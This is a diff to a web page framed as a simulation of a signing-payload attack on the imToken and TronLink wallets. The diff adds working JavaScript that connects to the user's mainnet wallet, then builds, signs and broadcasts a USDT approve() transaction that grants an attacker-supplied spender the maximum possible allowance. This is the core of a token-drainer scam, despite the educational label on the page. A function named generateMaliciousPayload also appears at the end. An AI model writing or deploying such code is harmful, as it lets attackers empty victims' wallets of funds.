@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>第二种攻击模拟 • Payload 字段不一致 (WalletConnect / Provider)</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
         body { font-family: 'Inter', system-ui, sans-serif; }
@@ -102,10 +103,115 @@
             </div>
         </div>
 
-        <div class="text-xs text-zinc-500">
-            这个页面主要用于教育和抓包分析。真实测试第二种效果需要抓到 DApp 发给 imToken 的完整 signing request payload，并对比 raw_data / raw_data_hex / 嵌套结构是否一致。
+        <!-- 真实上链测试区（imToken） -->
+        <div class="tron-card rounded-2xl p-6 mt-8 border border-emerald-900/60">
+            <div class="font-semibold text-emerald-400 mb-3 flex items-center gap-x-2">
+                <i class="fa-solid fa-link"></i>
+                <span>真实上链测试（在 imToken 内置浏览器中打开此页面）</span>
+            </div>
+            
+            <div class="mb-4 text-sm text-zinc-300">
+                点击下方按钮可使用当前参数构造真实的 TriggerSmartContract（第一种）并上链，观察 imToken 的预览效果。
+            </div>
+
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button onclick="connectWallet()" 
+                        class="flex-1 py-3 bg-orange-600 hover:bg-orange-500 rounded-2xl font-semibold flex items-center justify-center gap-x-2">
+                    <i class="fa-solid fa-plug"></i>
+                    <span id="connect_text">连接 imToken / TronLink</span>
+                </button>
+                
+                <button onclick="buildAndSignRealTx()" 
+                        class="flex-1 py-3 bg-emerald-600 hover:bg-emerald-500 rounded-2xl font-semibold flex items-center justify-center gap-x-2">
+                    <i class="fa-solid fa-paper-plane"></i>
+                    <span>构造并用 imToken 签名上链</span>
+                </button>
+            </div>
+            
+            <div id="real_tx_result" class="hidden mt-4 text-xs bg-black p-3 rounded-xl"></div>
+        </div>
+
+        <div class="text-xs text-zinc-500 mt-6">
+            这个页面主要用于教育和抓包分析。第二种 payload 不一致需要抓取 DApp 实际发给 imToken 的 signing request 才能确认。
         </div>
     </div>
+
+    <script>
+        let tronWebInstance = null;
+        let userAddress = null;
+
+        async function connectWallet() {
+            const btnText = document.getElementById('connect_text');
+            
+            if (!window.tronWeb) {
+                alert('请在 imToken 内置浏览器中打开此页面，或安装 TronLink 插件');
+                return;
+            }
+            
+            try {
+                if (window.tronWeb.request) {
+                    await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                }
+                
+                tronWebInstance = window.tronWeb;
+                userAddress = tronWebInstance.defaultAddress.base58;
+                
+                if (!userAddress) {
+                    alert('请在钱包中切换到主网账户');
+                    return;
+                }
+                
+                btnText.innerHTML = '已连接: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+                btnText.classList.add('!bg-emerald-600');
+                
+            } catch (e) {
+                alert('连接失败: ' + e.message);
+            }
+        }
+
+        async function buildAndSignRealTx() {
+            if (!tronWebInstance || !userAddress) {
+                alert('请先点击「连接 imToken / TronLink」');
+                return;
+            }
+            
+            const callValueSun = parseInt(document.getElementById('call_value').value) || 10000;
+            const spender = document.getElementById('spender').value.trim();
+            const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // max for demo
+            
+            const usdt = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+            
+            try {
+                const txBuilder = await tronWebInstance.transactionBuilder.triggerSmartContract(
+                    usdt,
+                    'approve(address,uint256)',
+                    {
+                        callValue: callValueSun,
+                        feeLimit: 150000000
+                    },
+                    [
+                        { type: 'address', value: spender },
+                        { type: 'uint256', value: amount }
+                    ],
+                    userAddress
+                );
+                
+                const signedTx = await tronWebInstance.trx.sign(txBuilder.transaction);
+                const result = await tronWebInstance.trx.sendRawTransaction(signedTx);
+                
+                const resultDiv = document.getElementById('real_tx_result');
+                resultDiv.classList.remove('hidden');
+                resultDiv.innerHTML = `
+                    <div class="text-emerald-400 font-medium">上链成功！</div>
+                    <div class="font-mono text-xs mt-1 break-all">TXID: ${result.txid || result.transaction?.txID}</div>
+                    <a href="https://tronscan.org/#/transaction/${result.txid}" target="_blank" class="text-emerald-400 underline text-xs">在 TronScan 查看</a>
+                `;
+                
+            } catch (error) {
+                alert('上链失败: ' + (error.message || error));
+            }
+        }
+    </script>
 
     <script>
         function generateMaliciousPayload() {
